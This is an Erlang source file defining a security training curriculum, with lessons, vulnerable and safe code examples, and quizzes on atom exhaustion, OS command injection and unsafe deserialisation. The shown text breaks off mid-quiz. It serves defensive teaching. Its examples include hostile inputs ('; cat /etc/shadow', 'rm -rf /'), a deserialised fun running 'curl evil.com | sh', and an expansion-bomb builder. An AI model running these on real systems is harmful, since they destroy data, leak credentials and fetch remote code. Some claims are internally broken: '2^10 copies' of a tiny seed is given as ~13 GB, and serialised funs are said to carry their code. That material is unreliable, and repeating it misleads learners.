-module(esc_curriculum).

-export([modules/0, get_module/1, module_ids/0]).

-type code_example() :: #{
    title := binary(),
    code := binary(),
    vulnerable => boolean(),
    explanation := binary(),
    output => binary()
}.

-type section() :: #{
    title := binary(),
    content := binary(),
    code_examples => [code_example()]
}.

-type quiz_question() :: #{
    id := binary(),
    type := multiple_choice | true_false,
    prompt := binary(),
    options => [#{id := binary(), text := binary()}],
    correct := binary(),
    explanation := binary()
}.

-type curriculum_module() :: #{
    id := binary(),
    number := pos_integer(),
    title := binary(),
    description := binary(),
    estimated_minutes := pos_integer(),
    sections := [section()],
    quiz := [quiz_question()]
}.

-export_type([curriculum_module/0, section/0, quiz_question/0, code_example/0]).

-spec module_ids() -> [binary()].
module_ids() ->
    [Id || #{id := Id} <- modules()].

-spec get_module(binary()) -> {ok, curriculum_module()} | error.
get_module(Id) ->
    case [M || M = #{id := MId} <- modules(), MId =:= Id] of
        [Module] -> {ok, Module};
        [] -> error
    end.

-spec modules() -> [curriculum_module()].
modules() ->
    [
        introduction_module(),
        atom_exhaustion_module(),
        serialisation_module(),
        command_injection_module(),
        sensitive_data_module(),
        memory_exhaustion_module(),
        distribution_module(),
        nif_port_safety_module(),
        code_loading_module(),
        scheduling_types_module(),
        introspection_module(),
        web_security_module()
    ].

%%% Module 1: Introduction to Erlang Security

introduction_module() ->
    #{
        id => <<"introduction">>,
        number => 1,
        title => <<"Introduction to Erlang Security">>,
        description => <<
            "Learn why security matters in Erlang/OTP applications and "
            "understand the BEAM VM's unique security characteristics."
        >>,
        estimated_minutes => 15,
        sections => [
            #{
                title => <<"Why Erlang Security Matters">>,
                content => <<
                    "<p>Erlang powers critical infrastructure: telecom switches, "
                    "messaging platforms, financial systems, and IoT backends. A security "
                    "vulnerability in these systems can have severe consequences.</p>"
                    "<p>While the BEAM VM provides strong isolation between processes and "
                    "excellent fault tolerance, it does <strong>not</strong> automatically "
                    "make your application secure. Many common vulnerability classes still "
                    "apply, and Erlang has its own unique attack surfaces.</p>"
                >>
            },
            #{
                title => <<"BEAM Security Model">>,
                content => <<
                    "<p>The BEAM VM offers several built-in security properties:</p>"
                    "<ul>"
                    "<li><strong>Process isolation</strong> &mdash; processes cannot access each "
                    "other's memory directly</li>"
                    "<li><strong>Immutable data</strong> &mdash; once bound, variables cannot be "
                    "modified, eliminating many race conditions</li>"
                    "<li><strong>Pattern matching</strong> &mdash; explicit data destructuring "
                    "reduces unexpected input handling</li>"
                    "<li><strong>Supervision trees</strong> &mdash; crash recovery limits the "
                    "blast radius of failures</li>"
                    "</ul>"
                    "<p>However, these properties don't protect against application-level "
                    "vulnerabilities like injection attacks, insecure deserialization, or "
                    "resource exhaustion.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Process Isolation">>,
                        code => <<
                            "% Each process has its own heap\n"
                            "spawn(fun() ->\n"
                            "    %% This data is isolated to this process\n"
                            "    Secret = <<\"my_secret_key\">>,\n"
                            "    receive\n"
                            "        {get_secret, Pid} ->\n"
                            "            %% Explicit choice to share\n"
                            "            Pid ! {secret, Secret}\n"
                            "    end\n"
                            "end)."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Process isolation means secrets stay within "
                            "their process unless explicitly sent via message passing."
                        >>,
                        output => <<"<0.123.0>">>
                    }
                ]
            },
            #{
                title => <<"Common Vulnerability Categories">>,
                content => <<
                    "<p>Throughout this curriculum, we'll cover these key areas:</p>"
                    "<ol>"
                    "<li><strong>Atom Exhaustion</strong> &mdash; creating atoms from untrusted "
                    "input can crash the VM</li>"
                    "<li><strong>Unsafe Deserialization</strong> &mdash; <code>binary_to_term/1</code> "
                    "can create atoms and execute code</li>"
                    "<li><strong>OS Command Injection</strong> &mdash; <code>os:cmd/1</code> "
                    "passes strings directly to the shell</li>"
                    "<li><strong>Sensitive Data Exposure</strong> &mdash; process state is "
                    "visible via <code>sys:get_state/1</code> and crash dumps</li>"
                    "<li><strong>Cryptography &amp; Timing</strong> &mdash; weak comparisons "
                    "and outdated algorithms</li>"
                    "<li><strong>Distribution Security</strong> &mdash; Erlang distribution "
                    "uses a shared cookie with full trust</li>"
                    "</ol>"
                >>
            }
        ],
        quiz => [
            #{
                id => <<"intro_q1">>,
                type => multiple_choice,
                prompt =>
                    <<"Which of the following is NOT a built-in security property of the BEAM VM?">>,
                options => [
                    #{id => <<"a">>, text => <<"Process isolation">>},
                    #{id => <<"b">>, text => <<"Immutable data">>},
                    #{id => <<"c">>, text => <<"Automatic input sanitization">>},
                    #{id => <<"d">>, text => <<"Supervision trees">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "The BEAM VM does not automatically sanitize input. "
                    "While process isolation, immutability, and supervision trees are "
                    "built-in features, developers must still validate and sanitize "
                    "all untrusted input."
                >>
            },
            #{
                id => <<"intro_q2">>,
                type => true_false,
                prompt => <<
                    "Erlang's process isolation guarantees that sensitive data "
                    "cannot be observed by other processes on the same node."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "False. While processes have separate heaps, tools like "
                    "sys:get_state/1, erlang:process_info/2, and crash dumps can expose "
                    "process state. The observer application also allows inspection of "
                    "any process on the node."
                >>
            },
            #{
                id => <<"intro_q3">>,
                type => multiple_choice,
                prompt => <<"Why is atom exhaustion a concern unique to Erlang/BEAM?">>,
                options => [
                    #{id => <<"a">>, text => <<"Atoms consume too much memory">>},
                    #{
                        id => <<"b">>,
                        text => <<"Atoms are never garbage collected and have a fixed limit">>
                    },
                    #{id => <<"c">>, text => <<"Atoms are mutable and can be overwritten">>},
                    #{id => <<"d">>, text => <<"Atoms cannot be sent between processes">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Atoms in the BEAM are stored in a global atom table that "
                    "is never garbage collected. The default limit is 1,048,576 atoms. "
                    "Converting untrusted input to atoms (e.g., via binary_to_atom/1 or "
                    "list_to_atom/1) can exhaust this table and crash the entire VM."
                >>
            }
        ]
    }.

%%% Module 2: Atom Exhaustion

atom_exhaustion_module() ->
    #{
        id => <<"atom_exhaustion">>,
        number => 2,
        title => <<"Atom Exhaustion">>,
        description => <<
            "Understand how atoms work in the BEAM VM, why they're never "
            "garbage collected, and how to prevent atom table exhaustion attacks."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"How Atoms Work in the BEAM">>,
                content => <<
                    "<p>Atoms are constants whose name is their value. They are stored "
                    "in a global <strong>atom table</strong> that is shared across all processes "
                    "on a BEAM node.</p>"
                    "<p>Key properties:</p>"
                    "<ul>"
                    "<li>Atoms are <strong>never garbage collected</strong></li>"
                    "<li>The atom table has a default limit of <strong>1,048,576</strong> entries</li>"
                    "<li>Exceeding this limit <strong>crashes the entire VM</strong></li>"
                    "<li>Atom comparison is O(1) &mdash; just comparing pointers</li>"
                    "</ul>"
                    "<p>This makes atoms excellent for tags, keys, and module names, but "
                    "dangerous when created from untrusted input.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Checking Atom Table Size">>,
                        code => <<
                            "erlang:system_info(atom_count).\n"
                            "%% => 12483\n\n"
                            "erlang:system_info(atom_limit).\n"
                            "%% => 1048576"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "You can monitor atom table usage to detect "
                            "potential exhaustion attacks."
                        >>,
                        output => <<"12483\n1048576">>
                    }
                ]
            },
            #{
                title => <<"Dangerous Functions">>,
                content => <<
                    "<p>These functions create new atoms from untrusted input and "
                    "should <strong>never</strong> be used with user-supplied data:</p>"
                    "<ul>"
                    "<li><code>list_to_atom/1</code></li>"
                    "<li><code>binary_to_atom/1,2</code></li>"
                    "<li><code>binary_to_term/1</code> (without the <code>safe</code> option)</li>"
                    "<li><code>erlang:apply/3</code> with user-supplied module/function names</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: API endpoint creating atoms">>,
                        code => <<
                            "handle_request(#{<<\"action\">> := Action}) ->\n"
                            "    %% DANGEROUS: converts user input to atom\n"
                            "    ActionAtom = binary_to_atom(Action, utf8),\n"
                            "    execute(ActionAtom)."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "An attacker can send millions of unique action values, "
                            "each creating a new atom that is never freed, eventually crashing "
                            "the VM."
                        >>,
                        output => <<
                            "** exception error: system_limit\n"
                            "     in function  binary_to_atom/2"
                        >>
                    },
                    #{
                        title => <<"Safe: Using binary_to_existing_atom">>,
                        code => <<
                            "handle_request(#{<<\"action\">> := Action}) ->\n"
                            "    try binary_to_existing_atom(Action, utf8) of\n"
                            "        ActionAtom ->\n"
                            "            execute(ActionAtom)\n"
                            "    catch\n"
                            "        error:badarg ->\n"
                            "            {error, invalid_action}\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "binary_to_existing_atom/2 only succeeds if the atom "
                            "already exists in the atom table, preventing creation of new atoms "
                            "from untrusted input."
                        >>,
                        output => <<"ok">>
                    }
                ]
            },
            #{
                title => <<"Safe Alternatives">>,
                content => <<
                    "<p>Use these patterns instead of creating atoms from input:</p>"
                    "<ul>"
                    "<li><code>binary_to_existing_atom/2</code> &mdash; only converts if atom "
                    "already exists</li>"
                    "<li><code>list_to_existing_atom/1</code> &mdash; same, for lists</li>"
                    "<li><strong>Allowlist pattern matching</strong> &mdash; match against known "
                    "values</li>"
                    "<li><strong>Keep data as binaries</strong> &mdash; use maps with binary keys "
                    "instead of atom keys for user data</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Best: Allowlist with pattern matching">>,
                        code => <<
                            "parse_action(<<\"create\">>) -> create;\n"
                            "parse_action(<<\"read\">>) -> read;\n"
                            "parse_action(<<\"update\">>) -> update;\n"
                            "parse_action(<<\"delete\">>) -> delete;\n"
                            "parse_action(_) -> {error, invalid_action}."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Pattern matching against known values is the safest "
                            "approach. No new atoms are ever created, and invalid input is "
                            "explicitly rejected."
                        >>,
                        output => <<"create">>
                    },
                    #{
                        title => <<"Vulnerable: binary_to_term without safe">>,
                        code => <<
                            "%% DANGEROUS: can create atoms AND execute code\n"
                            "Data = binary_to_term(UntrustedBinary).\n\n"
                            "%% SAFE: restricts to existing atoms\n"
                            "Data = binary_to_term(UntrustedBinary, [safe])."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "binary_to_term/1 without the [safe] option can create "
                            "new atoms and even construct function objects. Always use the "
                            "[safe] option with untrusted data."
                        >>,
                        output => <<"">>
                    }
                ]
            },
            #{
                title => <<"Monitoring & Detection">>,
                content => <<
                    "<p>Monitor atom table usage in production:</p>"
                    "<ul>"
                    "<li>Track <code>erlang:system_info(atom_count)</code> over time</li>"
                    "<li>Alert when atom count grows unexpectedly</li>"
                    "<li>Use <code>+t</code> VM flag to increase the atom table limit "
                    "(buying time, not fixing the root cause)</li>"
                    "</ul>"
                    "<p>A steadily growing atom count in production is a strong signal "
                    "of an atom leak from untrusted input.</p>"
                >>
            }
        ],
        quiz => [
            #{
                id => <<"atom_q1">>,
                type => multiple_choice,
                prompt => <<"What happens when the atom table reaches its limit?">>,
                options => [
                    #{id => <<"a">>, text => <<"The oldest atoms are garbage collected">>},
                    #{id => <<"b">>, text => <<"New atom creation silently fails">>},
                    #{id => <<"c">>, text => <<"The entire VM crashes">>},
                    #{id => <<"d">>, text => <<"Only the offending process crashes">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "When the atom table is full, the entire BEAM VM crashes "
                    "with a system_limit error. This is not isolated to a single process "
                    "&mdash; all processes on the node are terminated."
                >>
            },
            #{
                id => <<"atom_q2">>,
                type => multiple_choice,
                prompt => <<"Which function is safe to use with untrusted input?">>,
                options => [
                    #{id => <<"a">>, text => <<"binary_to_atom(Input, utf8)">>},
                    #{id => <<"b">>, text => <<"list_to_atom(Input)">>},
                    #{id => <<"c">>, text => <<"binary_to_existing_atom(Input, utf8)">>},
                    #{id => <<"d">>, text => <<"binary_to_term(Input)">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "binary_to_existing_atom/2 is safe because it only succeeds "
                    "if the atom already exists in the atom table. It will raise a badarg "
                    "error for unknown atoms rather than creating new ones."
                >>
            },
            #{
                id => <<"atom_q3">>,
                type => true_false,
                prompt => <<
                    "Using binary_to_term(Data, [safe]) prevents all security "
                    "risks from deserializing untrusted data."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "The [safe] option prevents creation of new atoms and "
                    "function objects, but deserialized data could still contain unexpected "
                    "structures. You should always validate the shape and content of "
                    "deserialized data, not just rely on the safe option."
                >>
            },
            #{
                id => <<"atom_q4">>,
                type => multiple_choice,
                prompt => <<
                    "What is the recommended pattern for converting user input to a "
                    "fixed set of atoms?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Use binary_to_atom with a try/catch">>},
                    #{id => <<"b">>, text => <<"Pattern match against known binary values">>},
                    #{id => <<"c">>, text => <<"Increase the atom table limit">>},
                    #{id => <<"d">>, text => <<"Store atoms in ETS for reuse">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Pattern matching against known binary values is the safest "
                    "approach. It creates no new atoms, explicitly documents the valid inputs, "
                    "and naturally rejects anything unexpected."
                >>
            }
        ]
    }.

%%% Module 4: OS Command Injection

command_injection_module() ->
    #{
        id => <<"command_injection">>,
        number => 4,
        title => <<"OS Command Injection">>,
        description => <<
            "Learn how os:cmd/1 and open_port/2 can be exploited for "
            "command injection, and how to safely execute external programs."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"The Danger of os:cmd/1">>,
                content => <<
                    "<p><code>os:cmd/1</code> passes its argument directly to the "
                    "system shell (<code>/bin/sh -c</code> on Unix). This means shell "
                    "metacharacters like <code>;</code>, <code>|</code>, <code>&&</code>, "
                    "and <code>$()</code> are all interpreted.</p>"
                    "<p>If any part of the command string comes from untrusted input, an "
                    "attacker can inject arbitrary shell commands.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: String concatenation with os:cmd">>,
                        code => <<
                            "lookup_user(Username) ->\n"
                            "    %% DANGEROUS: shell injection\n"
                            "    Cmd = \"grep \" ++ Username ++ \" /etc/passwd\",\n"
                            "    os:cmd(Cmd).\n\n"
                            "%% Attacker sends: \"; cat /etc/shadow\"\n"
                            "%% Executed: grep ; cat /etc/shadow /etc/passwd"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The attacker's input is interpolated directly into "
                            "a shell command. The semicolon terminates the grep and starts "
                            "a new command that reads the shadow password file."
                        >>,
                        output => <<
                            "root:$6$...:19000:0:99999:7:::\n"
                            "daemon:*:19000:0:99999:7:::"
                        >>
                    },
                    #{
                        title => <<"Vulnerable: Using io_lib:format">>,
                        code => <<
                            "convert_image(Filename) ->\n"
                            "    %% Still dangerous: format doesn't sanitize\n"
                            "    Cmd = io_lib:format(\n"
                            "        \"convert ~s -resize 100x100 thumb_~s\",\n"
                            "        [Filename, Filename]\n"
                            "    ),\n"
                            "    os:cmd(Cmd).\n\n"
                            "%% Attacker uploads: \"pic.jpg; rm -rf /\""
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "io_lib:format does string formatting, not shell "
                            "escaping. The attacker's filename still contains shell "
                            "metacharacters that will be interpreted."
                        >>,
                        output => <<"">>
                    }
                ]
            },
            #{
                title => <<"Safe Alternatives">>,
                content => <<
                    "<p>The key principle: <strong>never construct shell command "
                    "strings from untrusted input</strong>. Instead:</p>"
                    "<ul>"
                    "<li>Use <code>open_port/2</code> with <code>{spawn_executable, Path}</code> "
                    "and <code>{args, ArgList}</code> to bypass the shell entirely</li>"
                    "<li>Use NIFs or port drivers for specific system interactions</li>"
                    "<li>Validate and allowlist input before any external command</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Safe: open_port with spawn_executable">>,
                        code => <<
                            "lookup_user(Username) ->\n"
                            "    Port = open_port(\n"
                            "        {spawn_executable, \"/usr/bin/grep\"},\n"
                            "        [\n"
                            "            {args, [\"--\", Username, \"/etc/passwd\"]},\n"
                            "            exit_status,\n"
                            "            stderr_to_stdout\n"
                            "        ]\n"
                            "    ),\n"
                            "    collect_output(Port).\n\n"
                            "collect_output(Port) ->\n"
                            "    receive\n"
                            "        {Port, {data, Data}} ->\n"
                            "            Data ++ collect_output(Port);\n"
                            "        {Port, {exit_status, _}} ->\n"
                            "            []\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "spawn_executable bypasses the shell entirely. Arguments "
                            "are passed directly to the program as argv entries. Shell "
                            "metacharacters in Username have no special meaning. The '--' "
                            "prevents Username from being interpreted as a flag."
                        >>,
                        output => <<"\"myuser:x:1000:1000::/home/myuser:/bin/bash\\n\"">>
                    }
                ]
            },
            #{
                title => <<"Input Validation">>,
                content => <<
                    "<p>Even with <code>open_port</code>, validate input:</p>"
                    "<ul>"
                    "<li>Allowlist acceptable characters (e.g., alphanumeric only)</li>"
                    "<li>Reject path traversal sequences (<code>..</code>)</li>"
                    "<li>Set maximum input length</li>"
                    "<li>Use <code>filename:basename/1</code> to strip directory components</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Input validation before external command">>,
                        code => <<
                            "-define(MAX_USERNAME_LEN, 32).\n\n"
                            "validate_username(Username) when is_list(Username) ->\n"
                            "    case length(Username) =< ?MAX_USERNAME_LEN andalso\n"
                            "         lists:all(fun is_alnum/1, Username) of\n"
                            "        true -> {ok, Username};\n"
                            "        false -> {error, invalid_username}\n"
                            "    end.\n\n"
                            "is_alnum(C) when C >= $a, C =< $z -> true;\n"
                            "is_alnum(C) when C >= $A, C =< $Z -> true;\n"
                            "is_alnum(C) when C >= $0, C =< $9 -> true;\n"
                            "is_alnum($_) -> true;\n"
                            "is_alnum(_) -> false."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Strict allowlist validation ensures only safe characters "
                            "reach the external command. Combined with spawn_executable, this "
                            "provides defense in depth."
                        >>,
                        output => <<"{ok, \"alice\"}">>
                    }
                ]
            },
            #{
                title => <<"Erlang-Native Alternatives">>,
                content => <<
                    "<p>Often, you don't need external commands at all. The Erlang "
                    "standard library provides many alternatives:</p>"
                    "<ul>"
                    "<li><code>file</code> module for file operations instead of shell commands</li>"
                    "<li><code>filelib</code> for file queries (exists, size, type)</li>"
                    "<li><code>zip</code> module instead of calling <code>unzip</code></li>"
                    "<li><code>crypto</code> module instead of calling <code>openssl</code></li>"
                    "<li><code>httpc</code> or third-party HTTP clients instead of <code>curl</code></li>"
                    "</ul>"
                    "<p>Every external command you eliminate is an injection vector removed.</p>"
                >>
            }
        ],
        quiz => [
            #{
                id => <<"cmd_q1">>,
                type => multiple_choice,
                prompt => <<"Why is os:cmd/1 dangerous with untrusted input?">>,
                options => [
                    #{id => <<"a">>, text => <<"It runs commands as root">>},
                    #{
                        id => <<"b">>,
                        text => <<"It passes the string to /bin/sh for interpretation">>
                    },
                    #{id => <<"c">>, text => <<"It doesn't return error codes">>},
                    #{id => <<"d">>, text => <<"It blocks the calling process">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "os:cmd/1 passes its argument to /bin/sh -c, which means "
                    "all shell metacharacters (;, |, &&, $(), etc.) are interpreted. An "
                    "attacker can use these to inject additional commands."
                >>
            },
            #{
                id => <<"cmd_q2">>,
                type => multiple_choice,
                prompt => <<
                    "What is the safest way to execute an external program with "
                    "user-supplied arguments?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"os:cmd with shell escaping">>},
                    #{id => <<"b">>, text => <<"open_port with {spawn, Cmd}">>},
                    #{
                        id => <<"c">>,
                        text => <<"open_port with {spawn_executable, Path} and {args, List}">>
                    },
                    #{id => <<"d">>, text => <<"os:cmd with input validation">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "open_port with spawn_executable bypasses the shell entirely. "
                    "Arguments are passed directly as argv entries to the program, so shell "
                    "metacharacters have no special meaning. {spawn, Cmd} still uses a shell."
                >>
            },
            #{
                id => <<"cmd_q3">>,
                type => true_false,
                prompt => <<
                    "Using io_lib:format to construct an os:cmd command string "
                    "prevents command injection."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "io_lib:format performs string formatting, not shell escaping. "
                    "Shell metacharacters in the formatted values will still be interpreted "
                    "by /bin/sh. There is no safe way to construct shell command strings "
                    "from untrusted input."
                >>
            },
            #{
                id => <<"cmd_q4">>,
                type => multiple_choice,
                prompt => <<
                    "What does the '--' argument do when passed to external commands "
                    "like grep?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"It enables verbose output">>},
                    #{
                        id => <<"b">>,
                        text => <<"It signals end of options, preventing flag injection">>
                    },
                    #{id => <<"c">>, text => <<"It enables recursive operation">>},
                    #{id => <<"d">>, text => <<"It suppresses error messages">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The '--' convention signals the end of command-line options. "
                    "Any arguments after it are treated as operands, not flags. This prevents "
                    "an attacker from injecting flags like '-r' or '--exec' through user input."
                >>
            }
        ]
    }.

%%% Modules 3-12: Generated from BEAM Book security analysis

serialisation_module() ->
    #{
        id => <<"serialisation">>,
        number => 3,
        title => <<"Unsafe Deserialisation">>,
        description => <<
            "Understand the dangers of binary_to_term/1 with untrusted data, "
            "including atom exhaustion, arbitrary code execution, and shared-term "
            "expansion bombs. Learn safe deserialisation patterns."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"Why binary_to_term Is Dangerous">>,
                content => <<
                    "<p><code>binary_to_term/1</code> reconstructs any Erlang term from "
                    "its external binary format. When called on untrusted data, three things "
                    "can go wrong:</p>"
                    "<ul>"
                    "<li><strong>Atom creation</strong> &mdash; new atoms are inserted into the "
                    "global atom table, which is never garbage collected. An attacker can exhaust "
                    "the table and crash the entire VM.</li>"
                    "<li><strong>Fun creation</strong> &mdash; the binary can encode function "
                    "objects. Calling a deserialised fun executes attacker-controlled code.</li>"
                    "<li><strong>VM crash</strong> &mdash; malformed terms can trigger internal "
                    "errors that take down the node.</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: deserialising user input">>,
                        code => <<
                            "handle_message(Bin) ->\n"
                            "    %% DANGEROUS: attacker controls the binary\n"
                            "    Term = binary_to_term(Bin),\n"
                            "    process(Term)."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "binary_to_term/1 will create any atoms and funs "
                            "encoded in the binary. An attacker can craft a payload that "
                            "creates millions of unique atoms, exhausting the atom table "
                            "and crashing the VM."
                        >>,
                        output => <<
                            "** exception error: system_limit\n"
                            "     in function  binary_to_term/1"
                        >>
                    },
                    #{
                        title => <<"Vulnerable: deserialised fun execution">>,
                        code => <<
                            "%% Attacker crafts a binary encoding:\n"
                            "%%   fun() -> os:cmd(\"curl evil.com | sh\") end\n"
                            "Bin = term_to_binary(\n"
                            "    fun() -> os:cmd(\"curl evil.com | sh\") end\n"
                            "),\n\n"
                            "%% Victim deserialises and calls the fun\n"
                            "F = binary_to_term(Bin),\n"
                            "F().  %% executes attacker's command"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Funs serialised with term_to_binary retain their "
                            "code. Deserialising and invoking one runs arbitrary code "
                            "on the victim's node."
                        >>,
                        output => <<"\"\" %% attacker payload executed">>
                    }
                ]
            },
            #{
                title => <<"Shared-Term Expansion Bomb">>,
                content => <<
                    "<p>The Erlang external term format supports <strong>shared "
                    "sub-terms</strong>. A small binary can encode a deeply nested structure "
                    "where each level doubles in size during reconstruction.</p>"
                    "<p>A level-10 shared tuple nesting produces a term that requires "
                    "<strong>~13 GB</strong> of memory when deep-copied. The binary itself "
                    "is only a few hundred bytes.</p>"
                    "<p>This is an effective denial-of-service vector: a tiny network "
                    "payload causes the VM to attempt a massive allocation and crash with "
                    "an out-of-memory error.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Expansion bomb construction">>,
                        code => <<
                            "%% Each level wraps the previous in a 2-tuple,\n"
                            "%% sharing the same sub-term.\n"
                            "bomb(0) -> <<\"seed\">>;\n"
                            "bomb(N) ->\n"
                            "    Inner = bomb(N - 1),\n"
                            "    {Inner, Inner}.\n\n"
                            "%% bomb(10) is tiny in memory (shared references),\n"
                            "%% but term_to_binary encodes sharing markers.\n"
                            "%% When the victim does binary_to_term and then\n"
                            "%% deep-copies the result (e.g. sending to another\n"
                            "%% process), sharing is expanded:\n"
                            "%%   Level 10 => 2^10 copies => ~13 GB allocation.\n"
                            "Payload = term_to_binary(bomb(10)).\n"
                            "byte_size(Payload).  %% only ~200 bytes"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The binary is small because shared sub-terms are "
                            "stored once with back-references. When the term is "
                            "deep-copied (message passing, ETS insert), sharing is "
                            "expanded exponentially. Level 10 attempts a ~13 GB "
                            "allocation, crashing the VM."
                        >>,
                        output => <<"~200">>
                    }
                ]
            },
            #{
                title => <<"The safe Option and Its Limits">>,
                content => <<
                    "<p><code>binary_to_term/2</code> with the <code>[safe]</code> option "
                    "prevents creation of new atoms and funs. This stops atom exhaustion "
                    "and code execution attacks.</p>"
                    "<p>However, <code>[safe]</code> does <strong>not</strong> protect against:</p>"
                    "<ul>"
                    "<li><strong>Expansion bombs</strong> &mdash; shared-term nesting still works</li>"
                    "<li><strong>Unexpected structures</strong> &mdash; the decoded term may not "
                    "match the expected shape, leading to crashes or logic errors</li>"
                    "<li><strong>Large terms</strong> &mdash; memory exhaustion from legitimately "
                    "large data</li>"
                    "</ul>"
                    "<p>Always validate the structure of deserialised data after decoding.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Using the safe option">>,
                        code => <<
                            "%% Rejects binaries containing new atoms or funs\n"
                            "safe_decode(Bin) ->\n"
                            "    try binary_to_term(Bin, [safe]) of\n"
                            "        Term -> validate_structure(Term)\n"
                            "    catch\n"
                            "        error:badarg ->\n"
                            "            {error, unsafe_term}\n"
                            "    end.\n\n"
                            "validate_structure(#{<<\"user\">> := Name, <<\"age\">> := Age})\n"
                            "  when is_binary(Name), is_integer(Age), Age > 0 ->\n"
                            "    {ok, #{name => Name, age => Age}};\n"
                            "validate_structure(_) ->\n"
                            "    {error, invalid_structure}."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "The [safe] option blocks new atoms and funs. The "
                            "validate_structure function then checks that the decoded "
                            "term matches the expected shape. Both layers are needed."
                        >>,
                        output => <<"{ok, #{name => <<\"alice\">>, age => 30}}">>
                    }
                ]
            },
            #{
                title => <<"BEAM Files and Supply Chain Risk">>,
                content => <<
                    "<p>The BEAM file format uses <code>binary_to_term</code> internally "
                    "to decode the <code>Attr</code> and <code>CInf</code> chunks, which "
                    "store module attributes and compilation info.</p>"
                    "<p>A tampered BEAM file in a dependency could contain malicious terms "
                    "in these chunks. When the module is loaded, the VM deserialises them. "
                    "This is a <strong>supply chain attack vector</strong>.</p>"
                    "<p>Mitigations:</p>"
                    "<ul>"
                    "<li>Pin dependency versions and verify checksums</li>"
                    "<li>Review dependencies before upgrading</li>"
                    "<li>Prefer JSON or Protocol Buffers for all external data exchange</li>"
                    "<li>Reserve Erlang external term format for trusted, internal communication only</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Safe: JSON for external APIs">>,
                        code => <<
                            "%% Use JSON for any data crossing trust boundaries\n"
                            "handle_api_request(Body) ->\n"
                            "    case json:decode(Body) of\n"
                            "        #{<<\"action\">> := Action, <<\"data\">> := Data} ->\n"
                            "            process_action(Action, Data);\n"
                            "        _ ->\n"
                            "            {error, bad_request}\n"
                            "    end.\n\n"
                            "%% Reserve binary_to_term for trusted internal use\n"
                            "handle_internal_rpc(Bin) ->\n"
                            "    %% Only called between nodes we control\n"
                            "    binary_to_term(Bin)."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "JSON cannot encode atoms, funs, or shared terms. "
                            "It is inherently safer for data from untrusted sources. "
                            "Reserve binary_to_term for communication between nodes "
                            "you fully control."
                        >>,
                        output => <<"{ok, processed}">>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"serial_q1">>,
                type => multiple_choice,
                prompt => <<
                    "Which of the following attacks is possible via binary_to_term/1 "
                    "on untrusted data?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Atom table exhaustion">>},
                    #{id => <<"b">>, text => <<"Arbitrary code execution via funs">>},
                    #{id => <<"c">>, text => <<"Memory exhaustion via expansion bombs">>},
                    #{id => <<"d">>, text => <<"All of the above">>}
                ],
                correct => <<"d">>,
                explanation => <<
                    "binary_to_term/1 without [safe] can create new atoms "
                    "(exhausting the atom table), reconstruct funs (enabling arbitrary "
                    "code execution), and decode shared-term bombs (causing massive "
                    "memory allocation). All three are real attack vectors."
                >>
            },
            #{
                id => <<"serial_q2">>,
                type => true_false,
                prompt => <<
                    "Using binary_to_term(Data, [safe]) fully protects against "
                    "shared-term expansion bombs."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "The [safe] option only prevents creation of new atoms "
                    "and funs. Shared-term expansion bombs still work because "
                    "they use legitimate data types. You must also validate the "
                    "size and structure of deserialised terms."
                >>
            },
            #{
                id => <<"serial_q3">>,
                type => multiple_choice,
                prompt => <<
                    "What is the safest format for exchanging data with "
                    "untrusted external systems?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Erlang external term format with [safe]">>},
                    #{id => <<"b">>, text => <<"JSON or Protocol Buffers">>},
                    #{id => <<"c">>, text => <<"Erlang external term format without options">>},
